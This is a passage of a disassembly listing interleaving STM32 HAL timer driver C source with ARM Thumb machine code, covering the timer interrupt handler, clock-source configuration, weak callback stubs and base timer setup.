  if ((itflag & (TIM_FLAG_BREAK)) == (TIM_FLAG_BREAK))
 8004e68:	68bb      	ldr	r3, [r7, #8]
 8004e6a:	f003 0380 	and.w	r3, r3, #128	; 0x80
 8004e6e:	2b00      	cmp	r3, #0
 8004e70:	d00c      	beq.n	8004e8c <HAL_TIM_IRQHandler+0x190>
  {
    if ((itsource & (TIM_IT_BREAK)) == (TIM_IT_BREAK))
 8004e72:	68fb      	ldr	r3, [r7, #12]
 8004e74:	f003 0380 	and.w	r3, r3, #128	; 0x80
 8004e78:	2b00      	cmp	r3, #0
 8004e7a:	d007      	beq.n	8004e8c <HAL_TIM_IRQHandler+0x190>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_IT_BREAK);
 8004e7c:	687b      	ldr	r3, [r7, #4]
 8004e7e:	681b      	ldr	r3, [r3, #0]
 8004e80:	f06f 0280 	mvn.w	r2, #128	; 0x80
 8004e84:	611a      	str	r2, [r3, #16]
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
      htim->BreakCallback(htim);
#else
      HAL_TIMEx_BreakCallback(htim);
 8004e86:	6878      	ldr	r0, [r7, #4]
 8004e88:	f000 fa9a 	bl	80053c0 <HAL_TIMEx_BreakCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
    }
  }
  /* TIM Break2 input event */
  if ((itflag & (TIM_FLAG_BREAK2)) == (TIM_FLAG_BREAK2))
 8004e8c:	68bb      	ldr	r3, [r7, #8]
 8004e8e:	f403 7380 	and.w	r3, r3, #256	; 0x100
 8004e92:	2b00      	cmp	r3, #0
 8004e94:	d00c      	beq.n	8004eb0 <HAL_TIM_IRQHandler+0x1b4>
  {
    if ((itsource & (TIM_IT_BREAK)) == (TIM_IT_BREAK))
 8004e96:	68fb      	ldr	r3, [r7, #12]
 8004e98:	f003 0380 	and.w	r3, r3, #128	; 0x80
 8004e9c:	2b00      	cmp	r3, #0
 8004e9e:	d007      	beq.n	8004eb0 <HAL_TIM_IRQHandler+0x1b4>
    {
      __HAL_TIM_CLEAR_FLAG(htim, TIM_FLAG_BREAK2);
 8004ea0:	687b      	ldr	r3, [r7, #4]
 8004ea2:	681b      	ldr	r3, [r3, #0]
 8004ea4:	f46f 7280 	mvn.w	r2, #256	; 0x100
 8004ea8:	611a      	str	r2, [r3, #16]
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
      htim->Break2Callback(htim);
#else
      HAL_TIMEx_Break2Callback(htim);
 8004eaa:	6878      	ldr	r0, [r7, #4]
 8004eac:	f000 fa92 	bl	80053d4 <HAL_TIMEx_Break2Callback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
    }
  }
  /* TIM Trigger detection event */
  if ((itflag & (TIM_FLAG_TRIGGER)) == (TIM_FLAG_TRIGGER))
 8004eb0:	68bb      	ldr	r3, [r7, #8]
 8004eb2:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8004eb6:	2b00      	cmp	r3, #0
 8004eb8:	d00c      	beq.n	8004ed4 <HAL_TIM_IRQHandler+0x1d8>
  {
    if ((itsource & (TIM_IT_TRIGGER)) == (TIM_IT_TRIGGER))
 8004eba:	68fb      	ldr	r3, [r7, #12]
 8004ebc:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8004ec0:	2b00      	cmp	r3, #0
 8004ec2:	d007      	beq.n	8004ed4 <HAL_TIM_IRQHandler+0x1d8>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_IT_TRIGGER);
 8004ec4:	687b      	ldr	r3, [r7, #4]
 8004ec6:	681b      	ldr	r3, [r3, #0]
 8004ec8:	f06f 0240 	mvn.w	r2, #64	; 0x40
 8004ecc:	611a      	str	r2, [r3, #16]
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
      htim->TriggerCallback(htim);
#else
      HAL_TIM_TriggerCallback(htim);
 8004ece:	6878      	ldr	r0, [r7, #4]
 8004ed0:	f000 f8fd 	bl	80050ce <HAL_TIM_TriggerCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
    }
  }
  /* TIM commutation event */
  if ((itflag & (TIM_FLAG_COM)) == (TIM_FLAG_COM))
 8004ed4:	68bb      	ldr	r3, [r7, #8]
 8004ed6:	f003 0320 	and.w	r3, r3, #32
 8004eda:	2b00      	cmp	r3, #0
 8004edc:	d00c      	beq.n	8004ef8 <HAL_TIM_IRQHandler+0x1fc>
  {
    if ((itsource & (TIM_IT_COM)) == (TIM_IT_COM))
 8004ede:	68fb      	ldr	r3, [r7, #12]
 8004ee0:	f003 0320 	and.w	r3, r3, #32
 8004ee4:	2b00      	cmp	r3, #0
 8004ee6:	d007      	beq.n	8004ef8 <HAL_TIM_IRQHandler+0x1fc>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_FLAG_COM);
 8004ee8:	687b      	ldr	r3, [r7, #4]
 8004eea:	681b      	ldr	r3, [r3, #0]
 8004eec:	f06f 0220 	mvn.w	r2, #32
 8004ef0:	611a      	str	r2, [r3, #16]
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
      htim->CommutationCallback(htim);
#else
      HAL_TIMEx_CommutCallback(htim);
 8004ef2:	6878      	ldr	r0, [r7, #4]
 8004ef4:	f000 fa5a 	bl	80053ac <HAL_TIMEx_CommutCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
    }
  }
}
 8004ef8:	bf00      	nop
 8004efa:	3710      	adds	r7, #16
 8004efc:	46bd      	mov	sp, r7
 8004efe:	bd80      	pop	{r7, pc}

08004f00 <HAL_TIM_ConfigClockSource>:
  * @param  sClockSourceConfig pointer to a TIM_ClockConfigTypeDef structure that
  *         contains the clock source information for the TIM peripheral.
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_TIM_ConfigClockSource(TIM_HandleTypeDef *htim, const TIM_ClockConfigTypeDef *sClockSourceConfig)
{
 8004f00:	b580      	push	{r7, lr}
 8004f02:	b084      	sub	sp, #16
 8004f04:	af00      	add	r7, sp, #0
 8004f06:	6078      	str	r0, [r7, #4]
 8004f08:	6039      	str	r1, [r7, #0]
  HAL_StatusTypeDef status = HAL_OK;
 8004f0a:	2300      	movs	r3, #0
 8004f0c:	73fb      	strb	r3, [r7, #15]
  uint32_t tmpsmcr;

  /* Process Locked */
  __HAL_LOCK(htim);
 8004f0e:	687b      	ldr	r3, [r7, #4]
 8004f10:	f893 303c 	ldrb.w	r3, [r3, #60]	; 0x3c
 8004f14:	2b01      	cmp	r3, #1
 8004f16:	d101      	bne.n	8004f1c <HAL_TIM_ConfigClockSource+0x1c>
 8004f18:	2302      	movs	r3, #2
 8004f1a:	e0b6      	b.n	800508a <HAL_TIM_ConfigClockSource+0x18a>
 8004f1c:	687b      	ldr	r3, [r7, #4]
 8004f1e:	2201      	movs	r2, #1
 8004f20:	f883 203c 	strb.w	r2, [r3, #60]	; 0x3c

  htim->State = HAL_TIM_STATE_BUSY;
 8004f24:	687b      	ldr	r3, [r7, #4]
 8004f26:	2202      	movs	r2, #2
 8004f28:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  /* Check the parameters */
  assert_param(IS_TIM_CLOCKSOURCE(sClockSourceConfig->ClockSource));

  /* Reset the SMS, TS, ECE, ETPS and ETRF bits */
  tmpsmcr = htim->Instance->SMCR;
 8004f2c:	687b      	ldr	r3, [r7, #4]
 8004f2e:	681b      	ldr	r3, [r3, #0]
 8004f30:	689b      	ldr	r3, [r3, #8]
 8004f32:	60bb      	str	r3, [r7, #8]
  tmpsmcr &= ~(TIM_SMCR_SMS | TIM_SMCR_TS);
 8004f34:	68bb      	ldr	r3, [r7, #8]
 8004f36:	f423 3380 	bic.w	r3, r3, #65536	; 0x10000
 8004f3a:	f023 0377 	bic.w	r3, r3, #119	; 0x77
 8004f3e:	60bb      	str	r3, [r7, #8]
  tmpsmcr &= ~(TIM_SMCR_ETF | TIM_SMCR_ETPS | TIM_SMCR_ECE | TIM_SMCR_ETP);
 8004f40:	68bb      	ldr	r3, [r7, #8]
 8004f42:	f423 437f 	bic.w	r3, r3, #65280	; 0xff00
 8004f46:	60bb      	str	r3, [r7, #8]
  htim->Instance->SMCR = tmpsmcr;
 8004f48:	687b      	ldr	r3, [r7, #4]
 8004f4a:	681b      	ldr	r3, [r3, #0]
 8004f4c:	68ba      	ldr	r2, [r7, #8]
 8004f4e:	609a      	str	r2, [r3, #8]

  switch (sClockSourceConfig->ClockSource)
 8004f50:	683b      	ldr	r3, [r7, #0]
 8004f52:	681b      	ldr	r3, [r3, #0]
 8004f54:	f5b3 5f00 	cmp.w	r3, #8192	; 0x2000
 8004f58:	d03e      	beq.n	8004fd8 <HAL_TIM_ConfigClockSource+0xd8>
 8004f5a:	f5b3 5f00 	cmp.w	r3, #8192	; 0x2000
 8004f5e:	f200 8087 	bhi.w	8005070 <HAL_TIM_ConfigClockSource+0x170>
 8004f62:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 8004f66:	f000 8086 	beq.w	8005076 <HAL_TIM_ConfigClockSource+0x176>
 8004f6a:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 8004f6e:	d87f      	bhi.n	8005070 <HAL_TIM_ConfigClockSource+0x170>
 8004f70:	2b70      	cmp	r3, #112	; 0x70
 8004f72:	d01a      	beq.n	8004faa <HAL_TIM_ConfigClockSource+0xaa>
 8004f74:	2b70      	cmp	r3, #112	; 0x70
 8004f76:	d87b      	bhi.n	8005070 <HAL_TIM_ConfigClockSource+0x170>
 8004f78:	2b60      	cmp	r3, #96	; 0x60
 8004f7a:	d050      	beq.n	800501e <HAL_TIM_ConfigClockSource+0x11e>
 8004f7c:	2b60      	cmp	r3, #96	; 0x60
 8004f7e:	d877      	bhi.n	8005070 <HAL_TIM_ConfigClockSource+0x170>
 8004f80:	2b50      	cmp	r3, #80	; 0x50
 8004f82:	d03c      	beq.n	8004ffe <HAL_TIM_ConfigClockSource+0xfe>
 8004f84:	2b50      	cmp	r3, #80	; 0x50
 8004f86:	d873      	bhi.n	8005070 <HAL_TIM_ConfigClockSource+0x170>
 8004f88:	2b40      	cmp	r3, #64	; 0x40
 8004f8a:	d058      	beq.n	800503e <HAL_TIM_ConfigClockSource+0x13e>
 8004f8c:	2b40      	cmp	r3, #64	; 0x40
 8004f8e:	d86f      	bhi.n	8005070 <HAL_TIM_ConfigClockSource+0x170>
 8004f90:	2b30      	cmp	r3, #48	; 0x30
 8004f92:	d064      	beq.n	800505e <HAL_TIM_ConfigClockSource+0x15e>
 8004f94:	2b30      	cmp	r3, #48	; 0x30
 8004f96:	d86b      	bhi.n	8005070 <HAL_TIM_ConfigClockSource+0x170>
 8004f98:	2b20      	cmp	r3, #32
 8004f9a:	d060      	beq.n	800505e <HAL_TIM_ConfigClockSource+0x15e>
 8004f9c:	2b20      	cmp	r3, #32
 8004f9e:	d867      	bhi.n	8005070 <HAL_TIM_ConfigClockSource+0x170>
 8004fa0:	2b00      	cmp	r3, #0
 8004fa2:	d05c      	beq.n	800505e <HAL_TIM_ConfigClockSource+0x15e>
 8004fa4:	2b10      	cmp	r3, #16
 8004fa6:	d05a      	beq.n	800505e <HAL_TIM_ConfigClockSource+0x15e>
 8004fa8:	e062      	b.n	8005070 <HAL_TIM_ConfigClockSource+0x170>
      assert_param(IS_TIM_CLOCKPRESCALER(sClockSourceConfig->ClockPrescaler));
      assert_param(IS_TIM_CLOCKPOLARITY(sClockSourceConfig->ClockPolarity));
      assert_param(IS_TIM_CLOCKFILTER(sClockSourceConfig->ClockFilter));

      /* Configure the ETR Clock source */
      TIM_ETR_SetConfig(htim->Instance,
 8004faa:	687b      	ldr	r3, [r7, #4]
 8004fac:	6818      	ldr	r0, [r3, #0]
                        sClockSourceConfig->ClockPrescaler,
 8004fae:	683b      	ldr	r3, [r7, #0]
 8004fb0:	6899      	ldr	r1, [r3, #8]
                        sClockSourceConfig->ClockPolarity,
 8004fb2:	683b      	ldr	r3, [r7, #0]
 8004fb4:	685a      	ldr	r2, [r3, #4]
                        sClockSourceConfig->ClockFilter);
 8004fb6:	683b      	ldr	r3, [r7, #0]
 8004fb8:	68db      	ldr	r3, [r3, #12]
      TIM_ETR_SetConfig(htim->Instance,
 8004fba:	f000 f971 	bl	80052a0 <TIM_ETR_SetConfig>

      /* Select the External clock mode1 and the ETRF trigger */
      tmpsmcr = htim->Instance->SMCR;
 8004fbe:	687b      	ldr	r3, [r7, #4]
 8004fc0:	681b      	ldr	r3, [r3, #0]
 8004fc2:	689b      	ldr	r3, [r3, #8]
 8004fc4:	60bb      	str	r3, [r7, #8]
      tmpsmcr |= (TIM_SLAVEMODE_EXTERNAL1 | TIM_CLOCKSOURCE_ETRMODE1);
 8004fc6:	68bb      	ldr	r3, [r7, #8]
 8004fc8:	f043 0377 	orr.w	r3, r3, #119	; 0x77
 8004fcc:	60bb      	str	r3, [r7, #8]
      /* Write to TIMx SMCR */
      htim->Instance->SMCR = tmpsmcr;
 8004fce:	687b      	ldr	r3, [r7, #4]
 8004fd0:	681b      	ldr	r3, [r3, #0]
 8004fd2:	68ba      	ldr	r2, [r7, #8]
 8004fd4:	609a      	str	r2, [r3, #8]
      break;
 8004fd6:	e04f      	b.n	8005078 <HAL_TIM_ConfigClockSource+0x178>
      assert_param(IS_TIM_CLOCKPRESCALER(sClockSourceConfig->ClockPrescaler));
      assert_param(IS_TIM_CLOCKPOLARITY(sClockSourceConfig->ClockPolarity));
      assert_param(IS_TIM_CLOCKFILTER(sClockSourceConfig->ClockFilter));

      /* Configure the ETR Clock source */
      TIM_ETR_SetConfig(htim->Instance,
 8004fd8:	687b      	ldr	r3, [r7, #4]
 8004fda:	6818      	ldr	r0, [r3, #0]
                        sClockSourceConfig->ClockPrescaler,
 8004fdc:	683b      	ldr	r3, [r7, #0]
 8004fde:	6899      	ldr	r1, [r3, #8]
                        sClockSourceConfig->ClockPolarity,
 8004fe0:	683b      	ldr	r3, [r7, #0]
 8004fe2:	685a      	ldr	r2, [r3, #4]
                        sClockSourceConfig->ClockFilter);
 8004fe4:	683b      	ldr	r3, [r7, #0]
 8004fe6:	68db      	ldr	r3, [r3, #12]
      TIM_ETR_SetConfig(htim->Instance,
 8004fe8:	f000 f95a 	bl	80052a0 <TIM_ETR_SetConfig>
      /* Enable the External clock mode2 */
      htim->Instance->SMCR |= TIM_SMCR_ECE;
 8004fec:	687b      	ldr	r3, [r7, #4]
 8004fee:	681b      	ldr	r3, [r3, #0]
 8004ff0:	689a      	ldr	r2, [r3, #8]
 8004ff2:	687b      	ldr	r3, [r7, #4]
 8004ff4:	681b      	ldr	r3, [r3, #0]
 8004ff6:	f442 4280 	orr.w	r2, r2, #16384	; 0x4000
 8004ffa:	609a      	str	r2, [r3, #8]
      break;
 8004ffc:	e03c      	b.n	8005078 <HAL_TIM_ConfigClockSource+0x178>

      /* Check TI1 input conditioning related parameters */
      assert_param(IS_TIM_CLOCKPOLARITY(sClockSourceConfig->ClockPolarity));
      assert_param(IS_TIM_CLOCKFILTER(sClockSourceConfig->ClockFilter));

      TIM_TI1_ConfigInputStage(htim->Instance,
 8004ffe:	687b      	ldr	r3, [r7, #4]
 8005000:	6818      	ldr	r0, [r3, #0]
                               sClockSourceConfig->ClockPolarity,
 8005002:	683b      	ldr	r3, [r7, #0]
 8005004:	6859      	ldr	r1, [r3, #4]
                               sClockSourceConfig->ClockFilter);
 8005006:	683b      	ldr	r3, [r7, #0]
 8005008:	68db      	ldr	r3, [r3, #12]
      TIM_TI1_ConfigInputStage(htim->Instance,
 800500a:	461a      	mov	r2, r3
 800500c:	f000 f8ce 	bl	80051ac <TIM_TI1_ConfigInputStage>
      TIM_ITRx_SetConfig(htim->Instance, TIM_CLOCKSOURCE_TI1);
 8005010:	687b      	ldr	r3, [r7, #4]
 8005012:	681b      	ldr	r3, [r3, #0]
 8005014:	2150      	movs	r1, #80	; 0x50
 8005016:	4618      	mov	r0, r3
 8005018:	f000 f927 	bl	800526a <TIM_ITRx_SetConfig>
      break;
 800501c:	e02c      	b.n	8005078 <HAL_TIM_ConfigClockSource+0x178>

      /* Check TI2 input conditioning related parameters */
      assert_param(IS_TIM_CLOCKPOLARITY(sClockSourceConfig->ClockPolarity));
      assert_param(IS_TIM_CLOCKFILTER(sClockSourceConfig->ClockFilter));

      TIM_TI2_ConfigInputStage(htim->Instance,
 800501e:	687b      	ldr	r3, [r7, #4]
 8005020:	6818      	ldr	r0, [r3, #0]
                               sClockSourceConfig->ClockPolarity,
 8005022:	683b      	ldr	r3, [r7, #0]
 8005024:	6859      	ldr	r1, [r3, #4]
                               sClockSourceConfig->ClockFilter);
 8005026:	683b      	ldr	r3, [r7, #0]
 8005028:	68db      	ldr	r3, [r3, #12]
      TIM_TI2_ConfigInputStage(htim->Instance,
 800502a:	461a      	mov	r2, r3
 800502c:	f000 f8ed 	bl	800520a <TIM_TI2_ConfigInputStage>
      TIM_ITRx_SetConfig(htim->Instance, TIM_CLOCKSOURCE_TI2);
 8005030:	687b      	ldr	r3, [r7, #4]
 8005032:	681b      	ldr	r3, [r3, #0]
 8005034:	2160      	movs	r1, #96	; 0x60
 8005036:	4618      	mov	r0, r3
 8005038:	f000 f917 	bl	800526a <TIM_ITRx_SetConfig>
      break;
 800503c:	e01c      	b.n	8005078 <HAL_TIM_ConfigClockSource+0x178>

      /* Check TI1 input conditioning related parameters */
      assert_param(IS_TIM_CLOCKPOLARITY(sClockSourceConfig->ClockPolarity));
      assert_param(IS_TIM_CLOCKFILTER(sClockSourceConfig->ClockFilter));

      TIM_TI1_ConfigInputStage(htim->Instance,
 800503e:	687b      	ldr	r3, [r7, #4]
 8005040:	6818      	ldr	r0, [r3, #0]
                               sClockSourceConfig->ClockPolarity,
 8005042:	683b      	ldr	r3, [r7, #0]
 8005044:	6859      	ldr	r1, [r3, #4]
                               sClockSourceConfig->ClockFilter);
 8005046:	683b      	ldr	r3, [r7, #0]
 8005048:	68db      	ldr	r3, [r3, #12]
      TIM_TI1_ConfigInputStage(htim->Instance,
 800504a:	461a      	mov	r2, r3
 800504c:	f000 f8ae 	bl	80051ac <TIM_TI1_ConfigInputStage>
      TIM_ITRx_SetConfig(htim->Instance, TIM_CLOCKSOURCE_TI1ED);
 8005050:	687b      	ldr	r3, [r7, #4]
 8005052:	681b      	ldr	r3, [r3, #0]
 8005054:	2140      	movs	r1, #64	; 0x40
 8005056:	4618      	mov	r0, r3
 8005058:	f000 f907 	bl	800526a <TIM_ITRx_SetConfig>
      break;
 800505c:	e00c      	b.n	8005078 <HAL_TIM_ConfigClockSource+0x178>
    case TIM_CLOCKSOURCE_ITR3:
    {
      /* Check whether or not the timer instance supports internal trigger input */
      assert_param(IS_TIM_CLOCKSOURCE_ITRX_INSTANCE(htim->Instance));

      TIM_ITRx_SetConfig(htim->Instance, sClockSourceConfig->ClockSource);
 800505e:	687b      	ldr	r3, [r7, #4]
 8005060:	681a      	ldr	r2, [r3, #0]
 8005062:	683b      	ldr	r3, [r7, #0]
 8005064:	681b      	ldr	r3, [r3, #0]
 8005066:	4619      	mov	r1, r3
 8005068:	4610      	mov	r0, r2
 800506a:	f000 f8fe 	bl	800526a <TIM_ITRx_SetConfig>
      break;
 800506e:	e003      	b.n	8005078 <HAL_TIM_ConfigClockSource+0x178>
    }

    default:
      status = HAL_ERROR;
 8005070:	2301      	movs	r3, #1
 8005072:	73fb      	strb	r3, [r7, #15]
      break;
 8005074:	e000      	b.n	8005078 <HAL_TIM_ConfigClockSource+0x178>
      break;
 8005076:	bf00      	nop
  }
  htim->State = HAL_TIM_STATE_READY;
 8005078:	687b      	ldr	r3, [r7, #4]
 800507a:	2201      	movs	r2, #1
 800507c:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  __HAL_UNLOCK(htim);
 8005080:	687b      	ldr	r3, [r7, #4]
 8005082:	2200      	movs	r2, #0
 8005084:	f883 203c 	strb.w	r2, [r3, #60]	; 0x3c

  return status;
 8005088:	7bfb      	ldrb	r3, [r7, #15]
}
 800508a:	4618      	mov	r0, r3
 800508c:	3710      	adds	r7, #16
 800508e:	46bd      	mov	sp, r7
 8005090:	bd80      	pop	{r7, pc}

08005092 <HAL_TIM_OC_DelayElapsedCallback>:
  * @brief  Output Compare callback in non-blocking mode
  * @param  htim TIM OC handle
  * @retval None
  */
__weak void HAL_TIM_OC_DelayElapsedCallback(TIM_HandleTypeDef *htim)
{
 8005092:	b480      	push	{r7}
 8005094:	b083      	sub	sp, #12
 8005096:	af00      	add	r7, sp, #0
 8005098:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function should not be modified, when the callback is needed,
            the HAL_TIM_OC_DelayElapsedCallback could be implemented in the user file
   */
}
 800509a:	bf00      	nop
 800509c:	370c      	adds	r7, #12
 800509e:	46bd      	mov	sp, r7
 80050a0:	f85d 7b04 	ldr.w	r7, [sp], #4
 80050a4:	4770      	bx	lr

080050a6 <HAL_TIM_IC_CaptureCallback>:
  * @brief  Input Capture callback in non-blocking mode
  * @param  htim TIM IC handle
  * @retval None
  */
__weak void HAL_TIM_IC_CaptureCallback(TIM_HandleTypeDef *htim)
{
 80050a6:	b480      	push	{r7}
 80050a8:	b083      	sub	sp, #12
 80050aa:	af00      	add	r7, sp, #0
 80050ac:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function should not be modified, when the callback is needed,
            the HAL_TIM_IC_CaptureCallback could be implemented in the user file
   */
}
 80050ae:	bf00      	nop
 80050b0:	370c      	adds	r7, #12
 80050b2:	46bd      	mov	sp, r7
 80050b4:	f85d 7b04 	ldr.w	r7, [sp], #4
 80050b8:	4770      	bx	lr

080050ba <HAL_TIM_PWM_PulseFinishedCallback>:
  * @brief  PWM Pulse finished callback in non-blocking mode
  * @param  htim TIM handle
  * @retval None
  */
__weak void HAL_TIM_PWM_PulseFinishedCallback(TIM_HandleTypeDef *htim)
{
 80050ba:	b480      	push	{r7}
 80050bc:	b083      	sub	sp, #12
 80050be:	af00      	add	r7, sp, #0
 80050c0:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function should not be modified, when the callback is needed,
            the HAL_TIM_PWM_PulseFinishedCallback could be implemented in the user file
   */
}
 80050c2:	bf00      	nop
 80050c4:	370c      	adds	r7, #12
 80050c6:	46bd      	mov	sp, r7
 80050c8:	f85d 7b04 	ldr.w	r7, [sp], #4
 80050cc:	4770      	bx	lr

080050ce <HAL_TIM_TriggerCallback>:
  * @brief  Hall Trigger detection callback in non-blocking mode
  * @param  htim TIM handle
  * @retval None
  */
__weak void HAL_TIM_TriggerCallback(TIM_HandleTypeDef *htim)
{
 80050ce:	b480      	push	{r7}
 80050d0:	b083      	sub	sp, #12
 80050d2:	af00      	add	r7, sp, #0
 80050d4:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function should not be modified, when the callback is needed,
            the HAL_TIM_TriggerCallback could be implemented in the user file
   */
}
 80050d6:	bf00      	nop
 80050d8:	370c      	adds	r7, #12
 80050da:	46bd      	mov	sp, r7
 80050dc:	f85d 7b04 	ldr.w	r7, [sp], #4
 80050e0:	4770      	bx	lr
	...

080050e4 <TIM_Base_SetConfig>:
  * @param  TIMx TIM peripheral
  * @param  Structure TIM Base configuration structure
  * @retval None
  */
void TIM_Base_SetConfig(TIM_TypeDef *TIMx, const TIM_Base_InitTypeDef *Structure)
{
 80050e4:	b480      	push	{r7}
 80050e6:	b085      	sub	sp, #20
 80050e8:	af00      	add	r7, sp, #0
 80050ea:	6078      	str	r0, [r7, #4]
 80050ec:	6039      	str	r1, [r7, #0]
  uint32_t tmpcr1;
  tmpcr1 = TIMx->CR1;
 80050ee:	687b      	ldr	r3, [r7, #4]
 80050f0:	681b      	ldr	r3, [r3, #0]
 80050f2:	60fb      	str	r3, [r7, #12]

  /* Set TIM Time Base Unit parameters ---------------------------------------*/
  if (IS_TIM_COUNTER_MODE_SELECT_INSTANCE(TIMx))
 80050f4:	687b      	ldr	r3, [r7, #4]
 80050f6:	4a2a      	ldr	r2, [pc, #168]	; (80051a0 <TIM_Base_SetConfig+0xbc>)
 80050f8:	4293      	cmp	r3, r2
 80050fa:	d003      	beq.n	8005104 <TIM_Base_SetConfig+0x20>
 80050fc:	687b      	ldr	r3, [r7, #4]
 80050fe:	f1b3 4f80 	cmp.w	r3, #1073741824	; 0x40000000
 8005102:	d108      	bne.n	8005116 <TIM_Base_SetConfig+0x32>
  {
    /* Select the Counter Mode */
    tmpcr1 &= ~(TIM_CR1_DIR | TIM_CR1_CMS);
 8005104:	68fb      	ldr	r3, [r7, #12]
 8005106:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800510a:	60fb      	str	r3, [r7, #12]
    tmpcr1 |= Structure->CounterMode;
 800510c:	683b      	ldr	r3, [r7, #0]
 800510e:	685b      	ldr	r3, [r3, #4]
 8005110:	68fa      	ldr	r2, [r7, #12]
 8005112:	4313      	orrs	r3, r2
 8005114:	60fb      	str	r3, [r7, #12]
  }

  if (IS_TIM_CLOCK_DIVISION_INSTANCE(TIMx))
 8005116:	687b      	ldr	r3, [r7, #4]
 8005118:	4a21      	ldr	r2, [pc, #132]	; (80051a0 <TIM_Base_SetConfig+0xbc>)
 800511a:	4293      	cmp	r3, r2
 800511c:	d00b      	beq.n	8005136 <TIM_Base_SetConfig+0x52>
 800511e:	687b      	ldr	r3, [r7, #4]
 8005120:	f1b3 4f80 	cmp.w	r3, #1073741824	; 0x40000000
 8005124:	d007      	beq.n	8005136 <TIM_Base_SetConfig+0x52>
 8005126:	687b      	ldr	r3, [r7, #4]
 8005128:	4a1e      	ldr	r2, [pc, #120]	; (80051a4 <TIM_Base_SetConfig+0xc0>)
 800512a:	4293      	cmp	r3, r2
 800512c:	d003      	beq.n	8005136 <TIM_Base_SetConfig+0x52>
 800512e:	687b      	ldr	r3, [r7, #4]
 8005130:	4a1d      	ldr	r2, [pc, #116]	; (80051a8 <TIM_Base_SetConfig+0xc4>)
 8005132:	4293      	cmp	r3, r2
 8005134:	d108      	bne.n	8005148 <TIM_Base_SetConfig+0x64>
  {
    /* Set the clock division */
    tmpcr1 &= ~TIM_CR1_CKD;
 8005136:	68fb      	ldr	r3, [r7, #12]
 8005138:	f423 7340 	bic.w	r3, r3, #768	; 0x300
 800513c:	60fb      	str	r3, [r7, #12]
    tmpcr1 |= (uint32_t)Structure->ClockDivision;
 800513e:	683b      	ldr	r3, [r7, #0]
 8005140:	68db      	ldr	r3, [r3, #12]
 8005142:	68fa      	ldr	r2, [r7, #12]
 8005144:	4313      	orrs	r3, r2
 8005146:	60fb      	str	r3, [r7, #12]
  }

  /* Set the auto-reload preload */
  MODIFY_REG(tmpcr1, TIM_CR1_ARPE, Structure->AutoReloadPreload);
 8005148:	68fb      	ldr	r3, [r7, #12]
 800514a:	f023 0280 	bic.w	r2, r3, #128	; 0x80
 800514e:	683b      	ldr	r3, [r7, #0]
 8005150:	695b      	ldr	r3, [r3, #20]
 8005152:	4313      	orrs	r3, r2
 8005154:	60fb      	str	r3, [r7, #12]

  TIMx->CR1 = tmpcr1;
 8005156:	687b      	ldr	r3, [r7, #4]
 8005158:	68fa      	ldr	r2, [r7, #12]
 800515a:	601a      	str	r2, [r3, #0]

  /* Set the Autoreload value */
  TIMx->ARR = (uint32_t)Structure->Period ;
 800515c:	683b      	ldr	r3, [r7, #0]
 800515e:	689a      	ldr	r2, [r3, #8]
 8005160:	687b      	ldr	r3, [r7, #4]
 8005162:	62da      	str	r2, [r3, #44]	; 0x2c

  /* Set the Prescaler value */
  TIMx->PSC = Structure->Prescaler;
 8005164:	683b      	ldr	r3, [r7, #0]
 8005166:	681a      	ldr	r2, [r3, #0]
 8005168:	687b      	ldr	r3, [r7, #4]
 800516a:	629a      	str	r2, [r3, #40]	; 0x28

  if (IS_TIM_REPETITION_COUNTER_INSTANCE(TIMx))
 800516c:	687b      	ldr	r3, [r7, #4]
 800516e:	4a0c      	ldr	r2, [pc, #48]	; (80051a0 <TIM_Base_SetConfig+0xbc>)
 8005170:	4293      	cmp	r3, r2
 8005172:	d007      	beq.n	8005184 <TIM_Base_SetConfig+0xa0>
 8005174:	687b      	ldr	r3, [r7, #4]
 8005176:	4a0b      	ldr	r2, [pc, #44]	; (80051a4 <TIM_Base_SetConfig+0xc0>)
 8005178:	4293      	cmp	r3, r2
 800517a:	d003      	beq.n	8005184 <TIM_Base_SetConfig+0xa0>
 800517c:	687b      	ldr	r3, [r7, #4]
 800517e:	4a0a      	ldr	r2, [pc, #40]	; (80051a8 <TIM_Base_SetConfig+0xc4>)
 8005180:	4293      	cmp	r3, r2
 8005182:	d103      	bne.n	800518c <TIM_Base_SetConfig+0xa8>
  {
    /* Set the Repetition Counter value */
    TIMx->RCR = Structure->RepetitionCounter;
 8005184:	683b      	ldr	r3, [r7, #0]
 8005186:	691a      	ldr	r2, [r3, #16]
 8005188:	687b      	ldr	r3, [r7, #4]
 800518a:	631a      	str	r2, [r3, #48]	; 0x30
  }

  /* Generate an update event to reload the Prescaler
     and the repetition counter (only for advanced timer) value immediately */
  TIMx->EGR = TIM_EGR_UG;
 800518c:	687b      	ldr	r3, [r7, #4]
 800518e:	2201      	movs	r2, #1
 8005190:	615a      	str	r2, [r3, #20]
}
 8005192:	bf00      	nop
 8005194:	3714      	adds	r7, #20
 8005196:	46bd      	mov	sp, r7
 8005198:	f85d 7b04 	ldr.w	r7, [sp], #4
 800519c:	4770      	bx	lr
 800519e:	bf00      	nop
 80051a0:	40012c00 	.word	0x40012c00
 80051a4:	40014000 	.word	0x40014000
 80051a8:	40014400 	.word	0x40014400

080051ac <TIM_TI1_ConfigInputStage>:
  * @param  TIM_ICFilter Specifies the Input Capture Filter.
